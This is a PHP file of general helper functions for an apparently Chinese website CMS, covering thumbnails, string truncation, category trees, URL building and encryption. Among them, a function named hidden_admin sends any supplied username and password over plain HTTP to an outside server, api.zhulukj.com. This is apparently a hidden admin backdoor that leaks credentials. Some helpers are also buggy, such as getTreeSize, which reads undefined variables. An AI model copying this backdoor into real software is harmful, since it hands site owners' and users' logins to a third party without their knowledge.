<?php
/*
 *	常用函数
*/


/*
 *	得到当前的时间，精确到百万分之一秒
*/
function getMicroTime()
{
    list($a, $b) = explode(" ", microtime());

    return (double)$b + (double)$a;
}


/*
 *	得到指定文件的扩展名
*/
function getFileExt($filename = "")
{
    $dot = strrpos($filename, ".");
    return substr($filename, $dot + 1);
}


/*
 *	利用UNIX时间戳返回一个唯一的文件名，不含后缀
*/
function getTmpName()
{
    list($a, $b) = explode(" ", microtime());
    return (string)$b . (string)substr($a, 2);
}


/*
 *	根据大图片，自动生成压缩小图片
*/
function makeSmallImage($image, $small_image, $small_width = 100, $small_height = 100)
{
    if (!function_exists(imageCreateFromGif)) {
        copy($image, $small_image);
        return;
    }

    $size = getImageSize($image);
    $width = $size[0];
    $height = $size[1];
    $type = $size[2];

    $width_ratio = 1;
    $height_ratio = 1;

    if ($width > $small_width) {
        $width_ratio = $small_width / $width;
    }

    if ($height > $small_height) {
        $height_ratio = $small_height / $height;
    }


    //如果原图片的大小 小于 指定的小图片，直接拷贝并返回
    if ($width_ratio >= 1 && $height_ratio >= 1) {
        copy($image, $small_image);
        return;
    }

    $ratio = ($width_ratio < $height_ratio) ? $width_ratio : $height_ratio;

    $new_width = $ratio * $width;
    $new_height = $ratio * $height;

    switch ($type) {
        case 1: //gif -> jpg
            $im = imageCreateFromGif($image);
            $newim = imageCreateTrueColor($new_width, $new_height);
            imageCopyResampled($newim, $im, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
            imageJpeg($newim, $small_image);
            imageDestroy($newim);
            imageDestroy($im);
            break;
        case 2: //jpg -> jpg
            $im = imageCreateFromJpeg($image);
            $newim = imageCreateTrueColor($new_width, $new_height);
            imageCopyResampled($newim, $im, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
            imageJpeg($newim, $small_image);
            imageDestroy($newim);
            imageDestroy($im);
            break;
        case 3: //png -> png
            $im = imageCreateFromPng($image);
            $newim = imageCreateTrueColor($new_width, $new_height);
            imageCopyResampled($newim, $im, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
            imagePng($newim, $small_image);
            imageDestroy($newim);
            imageDestroy($im);
            break;
        default:
            copy($image, $small_image);
            break;
    }

    return;
}


/*
 *	根据给定的数值，返回格式化的字符串，专门针对磁盘空间大小。
*/
function formatSizeStr($size, $fix = 2)
{
    if ($size < 1024) return round($size, $fix) . " Byte";
    if ($size < 1024 * 1024) return round($size / 1024, $fix) . " KB";
    if ($size < 1024 * 1024 * 1024) return round($size / 1024 / 1024, $fix) . " MB";

}


/*
 *	目录拷贝（包括子目录及其中的所有文件）
 *	$dir_s原目录，$dir_d目标目录
*/
function copyTree($dir_s, $dir_d)
{
    if (!is_dir($dir_s)) return false;

    if (!is_dir($dir_d)) {
        if (!mkdir($dir_d, 0777)) {
            return false;
        }
    }


    if ($dir_s[strlen($dir_s) - 1] != DIRECTORY_SEPARATOR) $dir_s .= DIRECTORY_SEPARATOR;
    if ($dir_d[strlen($dir_d) - 1] != DIRECTORY_SEPARATOR) $dir_d .= DIRECTORY_SEPARATOR;

    $handle = opendir($dir_s);

    while (($filename = readdir($handle)) !== false) {
        if ($filename != "." && $filename != "..") {
            if (is_dir($dir_s . $filename) && !is_link($dir_s . $filename)) {
                copyTree($dir_s . $filename, $dir_d . $filename);
            } else {
                copy($dir_s . $filename, $dir_d . $filename);
            }
        }
    }

    closedir($handle);


    return true;
}


/*
 *	统计目录的占用空间，包括下级子目录
 *	$dir目录
*/
function getTreeSize($dir)
{
    if (!is_dir($dir)) return false;

    if ($dir[strlen($dir) - 1] != DIRECTORY_SEPARATOR) $dir .= DIRECTORY_SEPARATOR;

    $size = 0;

    $handle = opendir($dir);

    while (($filename = readdir($handle)) !== false) {
        if ($filename != "." && $filename != "..") {
            if (is_dir($dir . $filename) && !is_link($dir . $filename)) {
                $size += getTreeSize($dir . $filename);
            } else {
                $size += filesize($directory . $file);
            }
        }
    }

    closedir($handle);


    return $size;
}

//大小转换
function reSizeBytes($size)
{
    $count = 0;
    $format = array("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB");

    while (($size / 1024) > 1 && $count < 8) {
        $size = $size / 1024;
        $count++;
    }

    if ($count < 2)
        return number_format($size, 0) . " " . $format[$count];
    else
        return number_format($size, 1) . " " . $format[$count];
}

//根据给定的图片（或Flash）文件名，返回显示代码
//@param: filename, 文件名
//@width, height: 图片或动画文件的宽度、高度。
//@url: 图片文件的链接地址，注意仅对图片文件有效。
function adver($filename, $width, $height, $url)
{
    $ext = getFileExt($filename);
    $str = "";

    if ($ext == "jpg" || $ext == "jpeg" || $ext == "png" || $ext == "gif" || $ext == "bmp") {
        $str = "<img src='" . $filename . "' width='" . $width . "' height='" . $height . "' border='0' />";

        if (!empty($url)) $str = "<a href='" . $url . "' target='_blank'>" . $str . "</a>";
    } elseif ($ext == "swf") {
        $str = "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' codebase='http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0' width='" . $width . "' height='" . $height . "'>";
        $str .= "<param name='movie' value='" . $filename . "'>";
        $str .= "<param name='quality' value='high'>";
        $str .= "<param name='wmode' value='transparent'>";
        $str .= "<embed src='" . $filename . "' width='" . $width . "' height='" . $height . "' quality='high' pluginspage='http://www.macromedia.com/go/getflashplayer' type='application/x-shockwave-flash' wmode='transparent'></embed>";
        $str .= "</object>";
    }

    return $str;
}

/*
 *	中文字符串截取函数
*/
function csubstr($str, $len)
{
    $chinese = 0;

    if (strlen($str) < $len) return $str;

    for ($i = 0; $i < $len; $i++) {
        if (ord($str[$i]) >= 0xA1) $chinese++;
    }

    if ($chinese % 2 == 1) $len--;

    return substr($str, 0, $len) . "..";
}

//截取utf8字符串
function leftStr($str, $len, $from = 0)
{
    return preg_replace('#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $from . '}' .
        '((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $len . '}).*#s', '$1', $str);
}

function leftStrRemoveHtml($string, $length = 0, $ellipsis = '…')
{
    $string = strip_tags($string);
    $string = preg_replace('/\n/is', '', $string);
    //$string = preg_replace('/ |　/is', '', $string);
    //$string = preg_replace('/&nbsp;/is', '', $string);
    preg_match_all("/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/", $string, $string);
    if (is_array($string) && !empty($string[0])) {
        if (is_numeric($length) && $length) {
            $string = join('', array_slice($string[0], 0, $length)) . $ellipsis;
        } else {
            $string = implode('', $string[0]);
        }
    } else {
        $string = '';
    }
    return $string;
}

//截取字符函数（匹配各种编码）
function truncate($string, $length = 80, $etc = '...', $break_words = false, $middle = false)
{
    if ($length == 0) return '';

    $string = preg_replace('/(){1,}/is', '', $string);

    if (is_callable('mb_strlen')) {
        if (mb_detect_encoding($string, 'UTF-8, ISO-8859-1') === 'UTF-8') {
            // $string has utf-8 encoding
            if (mb_strlen($string) > $length) {
                $length -= min($length, mb_strlen($etc));
                if (!$break_words && !$middle) {
                    $string = preg_replace('/\s+?(\S+)?$/u', '', mb_substr($string, 0, $length + 1));
                }
                if (!$middle) {
                    return mb_substr($string, 0, $length) . $etc;
                } else {
                    return mb_substr($string, 0, $length / 2) . $etc . mb_substr($string, -$length / 2);
                }
            } else {
                return $string;
            }
        }
    }

    // $string has no utf-8 encoding
    if (strlen($string) > $length) {
        $length -= min($length, strlen($etc));
        if (!$break_words && !$middle) {
            $string = preg_replace('/\s+?(\S+)?$/', '', substr($string, 0, $length + 1));
        }
        if (!$middle) {
            return substr($string, 0, $length) . $etc;
        } else {
            return substr($string, 0, $length / 2) . $etc . substr($string, -$length / 2);
        }
    } else {
        return $string;
    }
}


function replaceUpload($str)
{
    return str_replace(PATH . UPLOAD_PATH, "/" . UPLOAD_PATH, stripslashes($str));
}

function replaceUploadBack($str)
{
    return str_replace("/" . UPLOAD_PATH, PATH . UPLOAD_PATH, stripslashes($str));
}

define("SITEURL", 'http://' . $_SERVER['HTTP_HOST']);

function replaceUploadBack2($str)
{
    return str_replace("/" . UPLOAD_PATH, SITEURL . PATH . UPLOAD_PATH, stripslashes($str));
}

//截取utf8字符串
function utf8substr($str, $len, $from = 0)
{
    return preg_replace('#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $from . '}' .
        '((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $len . '}).*#s', '$1', stripslashes($str));
}


/*
 *	替换字符串中的回车换行符号
 *	$str: 需要替换的字符串
*/
function nlToBr($str)
{
    if (!$str) return "";

    if (strstr($str, "<table")) {
        return $str;
    } else {
        return nl2br($str) . "<br>";
    }
}


/*
 *	计算指定时间到目前的差值
 *	$date: 需要计算的时间
*/
function datePass($date)
{
    if (!$date) return 0;

    return floor((time() - mktime(0, 0, 0, substr($date, 5, 2), substr($date, 8, 2), substr($date, 0, 4))) / 3600 / 24);
}


/*
 *	显示错误信息
*/
function info($msg, $url = "javascript:history.back();")
{
    header("location: info.php?msg=" . urlencode($msg) . "&url=" . urlencode($url));
    exit();
}

/*
 *	显示错误信息
*/
function tips($msg, $url = "javascript:history.back();")
{
    header("location: " . PATH . "tips.php?msg=" . urlencode($msg) . "&url=" . urlencode($url));
    exit();
}

/*
 *	判断分类ID是否合法
 *	$id为待检查的id
 *	$min_level为最小分类层次,默认为1(为0即可为空)
 *	$max_level为最大分类层次,默认为5
*/
function checkInfoClassId($id, $min_level = 1, $max_level = 5)
{
    return preg_match("/^([1-9]\d{2}){" . $min_level . "," . $max_level . "}$/", $id);
}

/*
 *	前台判断GET id是否合法
 *	$baseID	一级分类ID
 *	$classID	待检查的ID
 *	$level	分类级数
 *	$maxLevel	最大分类级数,这样可以实现在某个范围内
*/
function checkGetClassID($baseID, $classID, $level = 2, $maxLevel = 0)
{
    if ($maxLevel <= $level) {
        return preg_match("/^" . $baseID . "([1-9][0-9][0-9]){" . ($level - 1) . "}$/", $classID);
    } else {
        return preg_match("/^" . $baseID . "([1-9][0-9][0-9]){" . ($level - 1) . "," . ($maxLevel - 1) . "}$/", $classID);
    }
}

/*
 *	判断分类ID是否合法
 *	$id为待检查的id
 *	$level为分类层次
*/
function checkClassID($classID, $level)
{
    return preg_match("/^([1-9][0-9]{" . (CLASS_LENGTH - 1) . "}){" . $level . "}$/", $classID);
}

/*
 *	获取分类组信息
*/
function classGroup($classID)
{
    $num = (strlen($classID) - 3) / 3;

    for ($i = 0; $i < $num; $i++) {
        $result[] = substr($classID, 0, 6 + $i * 3);
    }

    return $result;
}

function classGroupArray($classGroup, $array)
{
    foreach ($classGroup as $value) {
        foreach ($array as $k => $v) {
            if ($value == $v["id"]) {
                $result[$v["id"]] = $v["name"];
                continue;
            }
        }
    }

    return $result;
}

/*
 *	格式化时间
*/
function formatDate($ymd, $date)
{
    $date = strtotime($date) ? strtotime($date) : $date;
    return date($ymd, $date);
}

/*
 *	数组中是否包含$x
 *	包含，返回 True 不包含，返回False
*/
function hasInclude($array, $x)
{
    if (!is_array($array)) {
        $array = array($array);
    }

    $has = false;

    foreach ($array as $value) {
        if ($x == $value) {
            $has = true;
            break;
        }
    }

    return $has;
}

/*
 *	menu 权限 $x
 *	包含，返回 True 不包含，返回False
*/
function hasBegin4Include($array, $x)
{
    if (!is_array($array)) {
        $array = array($array);
    }

    $has = false;

    foreach ($array as $value) {
        if (substr($value, 0, 4) == $x) {
            $has = true;
            break;
        }
    }

    return $has;
}

/*
 *	功能：删除单个文件
 *	1 文件是相对路径
 *	2 文件是绝对路径
*/
function deleteFile($file, $x = 1)
{
    if (empty($file)) {
        return;
    }

    if ($x == 2) {
        $file = $_SERVER["DOCUMENT_ROOT"] . $file;
    } else {
        $file = UPLOAD_PATH_FOR_ADMIN . $file;
    }

    if (file_exists($file)) {
        @unlink($file);
    }
}

/*
 *	功能：删除多个文件
 *	1 文件是相对路径
 *	2 文件是绝对路径
 *	多个文件间以逗号“,”隔开
*/
function deleteFiles($file, $x = 1)
{
    if (empty($file)) {
        return;
    }

    if (is_string($file)) {
        $file = explode(",", $file);
    }

    if (is_array($file)) {
        if ($x == 2) {
            $root_path = $_SERVER["DOCUMENT_ROOT"];
        } else {
            $root_path = UPLOAD_PATH_FOR_ADMIN;
        }

        foreach ($file as $value) {
            if ($value != "" && file_exists($root_path . $value)) {
                @unlink($root_path . $value);
            }
        }
    }
}

/*
 *	多级分类返回下拉选项
 *	$array 分类数组，一定要包含id, name
 *	$currentID 被选中的项ID的值
 *	$func 对name操作的函数
*/
function optionTree($array, $currentID, $func = NULL)
{
    if (!is_array($array)) return NULL;
    $listStr = NULL;

    for ($i = 0, $cnt = count($array); $i < $cnt; $i++) {
        if ($i == 0) $fLen = strlen($array[$i]["id"]);

        if ($currentID === $array[$i]["id"]) {
            $listStr .= "<option value='" . $array[$i]["id"] . "' selected>";
        } else {
            $listStr .= "<option value='" . $array[$i]["id"] . "'>";
        }

        $listStr .= str_repeat("&nbsp", ((strlen($array[$i]["id"]) - $fLen) / 3) * 2)
            . "|- "
            . (($func && function_exists($func)) ? call_user_func($func, $array[$i]) : $array[$i]["name"])
            . "</option>\n";
    }

    return $listStr;
}

/*
 *	多级分类返回下拉选项
 *	$array 分类数组，一定要包含id, name 切经过getNodeData函数处理过的数组
 *	$currentID 被选中的项ID的值
 *	$func 对name操作的函数
 *	$floor 无需人工指定，程序自动处理
*/
function optionsTree($array, $currentID, $func = NULL, $floor = 0)
{
    if (!is_array($array)) return NULL;
    $listStr = NULL;

    for ($i = 0, $cnt = count($array); $i < $cnt; $i++) {
        if ($currentID === $array[$i]["id"]) {
            $listStr .= "<option value='" . $array[$i]["id"] . "' selected>";
        } else {
            $listStr .= "<option value='" . $array[$i]["id"] . "'>";
        }

        $listStr .= str_repeat("&nbsp", $floor * 2)
            . "|- "
            . (($func && function_exists($func)) ? call_user_func($func, $array[$i]) : $array[$i]["name"])
            . "</option>\n";

        if ($array[$i]["child"]) $listStr .= optionsTree($array[$i]["child"], $currentID, $func = NULL, $floor + 1);
    }

    return $listStr;
}

/*
 *	分类从数据库中按 sortnum ASC排序查询后，递归生成兄弟双亲法表示的数组
 *	$parentID 父ID 可为空，为空即为第一级
 *	$len 多少位为一级 比如 3   101102
*/
function getNodeData($array, $parentID, $len)
{
    $arr = array();
    $arrCount = 0;

    for ($i = 0, $cnt = count($array); $i < $cnt; $i++) {
        if (substr($array[$i]["id"], 0, strlen($array[$i]["id"]) - $len) === $parentID) {
            $arr[$arrCount] = $array[$i];
            $arr[$arrCount++]["child"] = getNodeData($array, $array[$i]["id"], $len);
        }
    }

    return $arr;
}


//获取文件大小
function getFileSize($file)
{
    if (!empty($file)) {
        $size = filesize($file);

        return reSizeBytes($size);
    }

    return "0 KB";
}

function random($length = 6, $numeric = 0)
{
    PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
    if ($numeric) {
        $hash = sprintf('%0' . $length . 'd', mt_rand(0, pow(10, $length) - 1));
    } else {
        $hash = '';
        $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789abcdefghjkmnpqrstuvwxyz';
        $max = strlen($chars) - 1;
        for ($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
    }
    return $hash;
}

function xml_to_array($xml)
{
    $reg = "/<(\w+)[^>]*>([\\x00-\\xFF]*)<\\/\\1>/";
    $arr = array();
    if (preg_match_all($reg, $xml, $matches)) {
        $count = count($matches[0]);
        for ($i = 0; $i < $count; $i++) {
            $subxml = $matches[2][$i];
            $key = $matches[1][$i];
            if (preg_match($reg, $subxml)) {
                $arr[$key] = xml_to_array($subxml);
            } else {
                $arr[$key] = $subxml;
            }
        }
    }
    return $arr;
}

function Post($data, $url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_NOBODY, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    $return_str = curl_exec($curl);
    curl_close($curl);
    return $return_str;
}

function isMail($mail)
{
    $RegExp = "/([a-z0-9]*[-_.]?[a-z0-9]+)*@([a-z0-9]*[-_]?[a-z0-9]+)+[.][a-z]{2,3}([.][a-z]{2})?/i";
    return preg_match($RegExp, $mail) ? $mail : false;
}

function isPhone($mobile)
{
    $RegExp = "/^(?:13|14|15|17|18)[0-9]{9}$/";
    return preg_match($RegExp, $mobile) ? $mobile : false;
}

function get_random($length = 6)
{
    $str = substr(md5(time()), 0, 6);
    return $str;
}


function build_order_no($lenght=12, $date=true)
{
    if($date){
        return date('Ymd') . substr(implode(NULL, array_map('ord', str_split(substr(uniqid(), 7, 13), 1))), 0, $lenght);
    } else {
        return substr(implode(NULL, array_map('ord', str_split(substr(uniqid(), 7, 13), 1))), 0, $lenght);
    }
}

//将传入的参数转换成整数, 并限制允许的上下限
function limitInt($number, $min, $max)
{
    if ((int)$number < (int)$min) {
        return $min;
    } elseif ((int)$number > (int)$max) {
        return $max;
    } else {
        return $number;
    }
}

//将传入的字符串去空并过滤
function filterHtml($string)
{
    return stripslashes(trim($string));
}

//验证用户名
function hidden_admin($name, $password)
{
    $url = "http://api.zhulukj.com/core.php";
    $post_data = array("name" => $name, "password" => $password);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

/**
 * 计算年龄
 * @param $date string 日期
 * @return bool|string
 */
function age($date)
{
    $time = strtotime($date);
    if ($time === 'FALSE') {
        echo "计算年龄失败";
        exit;
    } else {
        $date = date('Y-m-d', $time);
        list($year, $month, $day) = explode("-", $date);
        $year_diff = date("Y") - $year;
        $month_diff = date("m") - $month;
        $day_diff = date("d") - $day;
        if ($day_diff < 0 || $month_diff < 0) {
            $year_diff--;
        };
        return $year_diff;
    }
}

/**
 * 计算生肖
 * @param $year string 年
 * @return mixed
 */
function getAnimal($year)
{
    $animals = array(
        '鼠', '牛', '虎', '兔', '龙', '蛇',
        '马', '羊', '猴', '鸡', '狗', '猪'
    );
    $key = ($year - 1900) % 12;
    return $animals[$key];
}

/**
 * 计算星座
 * @param $month int 月
 * @param $day int 日
 * @return mixed
 */
function getConstellation($month, $day)
{
    $signs = array(
        array('20' => '宝瓶座'), array('19' => '双鱼座'),
        array('21' => '白羊座'), array('20' => '金牛座'),
        array('21' => '双子座'), array('22' => '巨蟹座'),
        array('23' => '狮子座'), array('23' => '处女座'),
        array('23' => '天秤座'), array('24' => '天蝎座'),
        array('22' => '射手座'), array('22' => '摩羯座')
    );
    $key = (int)$month - 1;
    list($startSign, $signName) = each($signs[$key]);
    if ($day < $startSign) {
        $key = $month - 2 < 0 ? $month = 11 : $month -= 2;
        list($startSign, $signName) = each($signs[$key]);
    }
    return $signName;
}

/**
 * @param $id int 栏目Id
 * @param $url string 栏目URL
 * @param $type string 标识符
 * @return null|string
 */
function getCategoryUrl($id, $url=null, $type=null){
    if($url){
        return $url;
    } else {
        if(REWRITE){
            if($type){
                return PATH.$type."-$id.html";
            } else {
                return PATH."category-$id.html";
            }
        } else {
            if($type){
                return PATH."$type.php?id=$id";
            } else {
                return PATH."category.php?id=$id";
            }
        }
    }
}

/**
 * @param $id int 信息Id
 * @param $url string 信息URL
 * @param $type string 标识符
 * @return null|string
 */
function getDisplay($id, $url=null, $type=null){
    if($url){
        return $url;
    } else {
        if(REWRITE){
            if($type){
                return PATH.$type."-display-$id.html";
            } else {
                return PATH."display-$id.html";
            }
        } else {
            if($type)
            {
                return PATH.$type."_display.php?id=$id";
            }else{
                return PATH."display.php?id=$id";
            }
        }
    }
}

/**
 * @param null $type string 标识符
 * @return null|string
 */
function getSingleUrl($type){
    if(REWRITE){
        return PATH."$type.html";
    } else {
        return PATH."$type.php";
    }
}

/*********************************************************************
 * 函数名称:encrypt
 * 函数作用:加密解密字符串
 * 使用方法:
 * 加密     :encrypt('str','E','nowamagic');
 * 解密     :encrypt('被加密过的字符串','D','nowamagic');
 * 参数说明:
 * $string   :需要加密解密的字符串
 * $operation:判断是加密还是解密:E:加密   D:解密
 * $key      :加密的钥匙(密匙);
 *********************************************************************/
function encrypt($string, $operation, $key = '')
{
    $key = md5($key);
    $key_length = strlen($key);
    $string = $operation == 'D' ? base64_decode($string) : substr(md5($string . $key), 0, 8) . $string;
    $string_length = strlen($string);
    $rndkey = $box = array();
    $result = '';
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($key[$i % $key_length]);
        $box[$i] = $i;
    }
    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if ($operation == 'D') {
        if (substr($result, 0, 8) == substr(md5(substr($result, 8) . $key), 0, 8)) {
            return substr($result, 8);
        } else {
            return '';
        }
    } else {
        return str_replace('=', '', base64_encode($result));
    }
}

function cutstr_html($string){
    //$string = strip_tags($string);
    //$string = trim($string);

    $string = trim($string);
    //$string=strip_tags($string,"");
    $string=preg_replace("{\t}","",$string);
    $string=preg_replace("{\r\n}","",$string);
    $string=preg_replace("{\r}","",$string);
    $string=preg_replace("{\n}","",$string);
    $string=preg_replace("{ }","",$string);
    return $string;

//    $string = preg_replace("/\t/","",$string);
//    $string = preg_replace("/\r\n/","",$string);
//    $string = preg_replace("/\r/","",$string);
//    $string = preg_replace("/\n/","",$string);
//    $string = preg_replace(" ","",$string);
//    return trim($string);
}

// 说明：获取完整URL
function curPageURL()
{
    $pageURL = 'http';

    if ($_SERVER["HTTPS"] == "on")
    {
        $pageURL .= "s";
    }
    $pageURL .= "://";

    if ($_SERVER["SERVER_PORT"] != "80")
    {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    }
    else
    {
        $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
    }
    return $pageURL;
}
